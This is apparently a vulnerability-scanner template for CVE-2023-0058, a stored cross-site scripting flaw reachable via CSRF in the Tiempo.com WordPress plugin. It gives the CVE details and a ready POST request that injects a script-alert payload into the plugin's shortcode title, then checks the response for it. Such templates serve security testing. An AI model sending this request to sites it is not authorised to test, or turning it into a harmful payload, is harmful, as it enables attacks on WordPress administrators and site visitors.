id: CVE-2023-0058

info:
  name: Stored XSS via CSRF in Tiempo.com WordPress Plugin
  author: ProjectDiscoveryAI
  severity: medium
  description: The Tiempo.com WordPress plugin through 0.1.2 does not have CSRF check when creating and editing its shortcode, and is missing sanitisation as well as escaping, which could allow attackers to make logged in admin add Stored XSS payloads via a CSRF attack.
  impact: |
    Successful exploitation could lead to unauthorized actions performed on behalf of the user.
  remediation: |
    Update the Tiempo.com WordPress Plugin to the latest version to mitigate the vulnerability.
  reference:
    - https://wpscan.com/vulnerability/0e677df9-2c49-42f0-a8e2-dbcf85bfc1a2
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-0058
    epss-score: 0.00068
    epss-percentile: 0.31626
    cpe: cpe:2.3:a:tiempo:tiempo:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: tiempo
    product: tiempo
    framework: wordpress
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=tiempocom%2Fapp%2Fadmin.php&action=new"

    body: |
      page=tiempocom%2Fapp%2Fadmin%2Fphp&title=%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E&language=en&continent=8&country=208&location=12325&location_label=Base%20Amundsen-Scott%20del%20Polo%20Sur&location_link=https%3A%2F%2Fwww.tiempo.com%2Fbase-amundsen-scott-del-polo-sur.htm&province_type=4&time=5&format=1&temperature_format=0&wind_format=0&rain_format=0&style=1&marquee=%23000000&background=%23FFFFFF&text=%23808080&max=%23FF0000&min=%230000FF&font=1&save=Save&action=-1&paged=1&action2=-1

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "<script>alert(/XSS/)</script>"
        part: body
